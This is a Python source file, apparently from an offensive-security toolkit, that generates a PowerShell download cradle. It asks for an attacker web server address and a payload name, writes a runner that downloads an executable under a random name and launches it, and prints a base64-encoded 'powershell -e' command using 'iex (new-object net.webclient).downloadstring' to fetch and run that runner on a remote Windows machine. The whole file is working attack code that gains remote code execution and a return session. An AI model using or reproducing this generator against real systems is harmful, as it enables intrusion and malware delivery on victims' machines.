from menus import bcolors

import base64
import random
import string

def powershell_cradle():
    """ A download cradle is a single line command for download and code execution.
        This function downloads a payload on a remote Windows machine in order to
        execute and get a return sessions. Generates an encoded PowerShell download
        cradle.
    """

    # specify the IP and port that will run a webserver on
    web_server_ip = input('[+] Web server listening host: ')
    web_server_port = input('[+] Web server port: ')

    payload_name = input('[+] Payload name: ')

    # create powershell runner containing the command string used to
    # download the file itself and execute
    runner_file = (''.join(random.choices(string.ascii_lowercase,k=6)))
    runner_file = f'{runner_file}.txt'

    randomised_exe_file = (''.join(random.choices(string.ascii_lowercase,k=6)))
    randomised_exe_file = f'{randomised_exe_file}.exe'

    print('[+] Run the following command to start a web server: ' + bcolors.BOLD + f'\npython3 -m http.server -b {web_server_ip} {web_server_port}')

    runner_cal_unencoded = f"iex (new-object net.webclient).downloadstring('http://{web_server_ip}:{web_server_port}/{runner_file}')".encode('utf-16le')

    with open(runner_file, 'w') as f:
        f.write(f'powershell -c wget http://{web_server_ip}:{web_server_port}/{payload_name} -outfile {randomised_exe_file}; Start-Process -FilePath {randomised_exe_file}')
        f.close()

    b64_runner_cal = base64.b64encode(runner_cal_unencoded)
    b64_runner_cal = b64_runner_cal.decode()
    print(f'\n[+] Encoded payload\n\npowershell -e {b64_runner_cal}')

    b64_runner_cal_decoded = base64.b64decode(b64_runner_cal).decode()
    print(f'\n[+] Unencoded payload\n\n{b64_runner_cal_decoded}')
